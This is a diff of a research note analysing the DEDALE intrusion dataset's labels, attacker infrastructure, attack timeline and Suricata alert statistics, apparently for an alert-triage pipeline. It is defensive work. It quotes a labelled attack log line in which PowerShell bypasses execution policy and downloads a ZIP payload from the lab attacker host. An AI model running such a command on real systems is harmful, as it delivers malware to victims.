@@ -2,11 +2,19 @@
 
 Data: `D:\agentsoc_data\dedale\` (outside the repo; CC BY 4.0, DOI 10.57745/Y5JLDG). All counts below come from read-only passes over the zips (nothing extracted). Calendar: weeks 1-2 benign (2024-12-23 .. 2025-01-05), attack in week 3 (8 days), dataset ends 2025-01-19.
 
+## Ground truth from the DEDALE website (read 2026-10-11: dedale.inria.fr/download.html, /attack_scenario.html)
+
+- **Label classes.** System logs: benign / class 1 "malicious logs (clearly linked to a malicious action)" / class 2 "malicious-related logs (consequences or dependent on how the attack step works)"; labelled from the known malicious processes and their sub-processes. Network (Zeek conn.log, per flow): 0 benign, 1 attack, 2 attack-related (not inherently malicious), plus MITRE tactic + technique and a description per malicious flow. Labelling scripts: gitlab.inria.fr/mlanvin/dedale_labeling.
+- **Recommended use:** weeks 1-2 for training/calibration, weeks 3-4 for testing only.
+- **Attacker infrastructure:** 172.19.1.1 (serves the meterpreter dropper), 172.19.2.1 (reverse shell), 172.19.0.2 (C2). Other 172.19.x addresses are simulated internet hosts (e.g. 172.19.0.4-13 send mail to 172.17.0.2), not the attacker.
+- **Timeline (UTC as on the site):** 2025-01-06 10:00 email infection of client 2 (172.16.1.3); 01-08 15:00 lateral movement to client 1 (172.16.1.2) via PrintNightmare; 01-10 11:00 collection on the samba server / DC (172.16.0.2); 01-11 11:00 exfiltration to the attacker; 01-12..01-13 11:40 malware extinction and last beaconing; normal activity before 01-06 and from 01-14.
+- The site also offers DFIR-ORC forensic artefacts for client_1..4, internal_server and dmz_server (not downloaded).
+
 ## Host labels (`system_logs_labels.zip`)
 
 - **Positives only.** Each file is a list of malicious raw events (Elastic/ECS JSON as shipped by winlogbeat/auditbeat). There is no list of benign events and no alert objects; negatives would be "every other event" in the full winlogbeat/auditbeat logs (not downloaded).
 - **Only three hosts are labelled:** CLIENT2 (8,440 events) and CLIENT1 (2,153) via winlogbeat; `internalserver` (5,190) via auditbeat (auditd), all on 2025-01-10.
-- Class 1 ⊂ class 1+2 for both zones (clients: 9,566 of 10,593; server: 4,409 of 5,190). The class-2-only examples look like side effects of attacker processes (e.g. `conhost.exe 0xffffffff -ForceV1`, image loads). **The meaning of class 1 vs class 2 is not stated in the downloaded README** — it is in the DEDALE article / website (not yet read).
+- Class 1 ⊂ class 1+2 for both zones (clients: 9,566 of 10,593; server: 4,409 of 5,190). Class-2-only examples (e.g. `conhost.exe 0xffffffff -ForceV1`, image loads) fit the website's definition of class 2 (malicious-related consequences, see above).
 - Client events by Sysmon event id: 11 FileCreate 6,639; 7 ImageLoad 2,922; 2 FileCreateTime 315; 10 ProcessAccess 141; 18 PipeConnected 123; 5 ProcessTerminate 122; 17 PipeCreated 122; **1 ProcessCreate 121**; 22 DNS 12; plus PowerShell 800/4103/600 (72). Only 195 of 10,593 carry `process.command_line`.
 - Client events by day: 01-06 462, 01-07 195, **01-08 8,038**, 01-09 195, 01-10 837, 01-11 196, 01-12 195, 01-13 475.
 - Example (CLIENT2, 2025-01-06T10:01:05Z): `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' ...`; 2025-01-08 15:01: `C:\Users\client2\AppData\Local\Temp\svcmon.exe`.
@@ -19,9 +27,24 @@ Data: `D:\agentsoc_data\dedale\` (outside the repo; CC BY 4.0, DOI 10.57745/Y5JL
 - Only 4 signatures first appear after the benign weeks (6 alerts in total):
   - `ET INFO Dotted Quad Host ZIP Request` ×2, 2025-01-06 10:01, 172.16.1.3 -> 172.19.1.1:80 — **matches CLIENT2's labelled Invoke-WebRequest download** (both routers saw it).
   - `ET POLICY SMB Executable File Transfer` ×1, 2025-01-08 15:05, 172.16.1.3 -> 172.16.0.2:445 — within 5 min of 6,714 labelled CLIENT2 events (svcmon.exe).
-  - `ET TROJAN Suspicious POST with Common Windows Process Names` ×1, 2025-01-06 08:10, from 172.16.1.15 — no labelled host event within ±5 min; host not covered by the labels.
-  - `ET TROJAN Backdoor family PCRat/Gh0st CnC traffic` ×2, 2025-01-08, from 172.16.1.30 and 172.16.1.6 to 172.16.0.2:445 — hosts not covered by the labels; status unknown.
-- Ground truth for network data is in the Zeek `conn.log` labels (not downloaded).
+  - `ET TROJAN Suspicious POST with Common Windows Process Names` ×1, 2025-01-06 08:10, from 172.16.1.15 — before the 10:00 infection, from a host the attack never touched: **false positive** (per the published timeline).
+  - `ET TROJAN Backdoor family PCRat/Gh0st CnC traffic` ×2, 2025-01-08, from 172.16.1.30 and 172.16.1.6 to the DC's SMB port — hosts the attack never touched: **false positives** (per the published timeline).
+- Alerts touching the attacker IPs (172.19.1.1 / 172.19.2.1 / 172.19.0.2): only the 2 ZIP-download copies. The C2 and reverse-shell traffic raised **no** Suricata alert.
+- Ground truth for network data is in the Zeek `conn.log` labels (not downloaded); for Suricata alerts it can also be derived from the published timeline + attacker/victim IPs.
+
+### Grouping (how many distinct cases the 1.47 M alerts are)
+
+| Unit | Count |
+|:--|--:|
+| raw alerts (both routers) | 1,465,627 |
+| after dropping the second router's copy (same sid + 5-tuple within 5 s) | 1,195,507 (weeks 1-2: 576,565; weeks 3-4: 618,942) |
+| groups (signature, src, dst, hour) | 39,755 |
+| groups (signature, src, dst, day) | 8,461 |
+| groups (signature, src, dst), whole dataset | 1,042 |
+| weeks 3-4 (signature, src, dst, day) groups | 4,413 |
+| … of which the (signature, src, dst) was never seen in weeks 1-2 | **357** (289 distinct) |
+
+The novel groups are mostly new external mail servers talking to 172.17.0.5 and new external IPs hitting clients — i.e. benign novelty — plus the attack's ZIP download.
 
 ## User behaviour (`userbehaviour_logs.zip`)
 
@@ -35,4 +58,5 @@ Data: `D:\agentsoc_data\dedale\` (outside the repo; CC BY 4.0, DOI 10.57745/Y5JL
 
 1. DEDALE does not ship labelled alerts. Alerts must be generated (e.g. Sigma rules over winlogbeat/auditbeat events) or taken from Suricata; labels must be joined from the event lists (host) or Zeek conn.log (network).
 2. Host-level negatives and the benign-week baseline need the full winlogbeat log (27.1 GB compressed) — the labels alone give positives only.
-3. Suricata alone is a realistic alert-fatigue stream but nearly blind to this APT (3 alerts match labelled activity out of 1.47 M), and only 3 hosts have ground truth.
+3. Suricata alone is a realistic alert-fatigue stream but nearly blind to this APT (3 alerts match labelled activity out of 1.47 M); its benign weeks are a clean negative set, and 3 attack-window alerts are confirmed false positives.
+4. LLM budget: the pipeline should run on groups, not raw alerts. With a benign-weeks baseline only ~357 group-days in weeks 3-4 are new; that is the scale of NCE calls, not 1.47 M.
